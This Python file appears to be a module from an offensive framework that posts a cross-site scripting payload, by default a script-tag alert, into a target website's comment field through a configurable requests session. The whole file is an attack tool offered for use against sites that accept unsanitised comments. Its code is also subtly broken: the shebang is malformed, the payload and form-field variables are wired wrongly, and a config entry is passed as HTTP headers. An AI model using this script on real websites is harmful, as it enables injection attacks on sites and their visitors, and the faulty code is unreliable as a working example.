#!usr/bin/python

import requests
from colorama import Fore, Style

URI=""
CommentField=""


class Exploit:
	config = {
        "URI": {"default": "https://www.example.com", "necessity": True},
        "Script": {"default": """<script>alert("Xss")</script>""", "necessity": True},
        "CommentField": {"default": "", "necessity": True},
        "useragent": {"default": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36", "necessity": False}
    	}

	def show_options(self):
		print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
				key, self.config[key]["necessity"], self.get_config(key))+Style.RESET_ALL)
	def run(self):
		Script=self.config["Script"]

		DataPost={CommentField:Script}

		HackingSession=requests.session()

		try:

			HackingSession.post(self.config["URI"], data=DataPost, headers=self.config["useragent"])

		except:
			print(Fore.RED+"[-]"+Style.RESET_ALL+" Cant't Send Payload")
			exit()

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"\nThis exploit is for websites\nthat are vulnerable to xss"+Style.RESET_ALL)

	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key]["default"] = value
		else:
			print("No options")

	def get_config(self, key):
		return self.config[key]["default"]
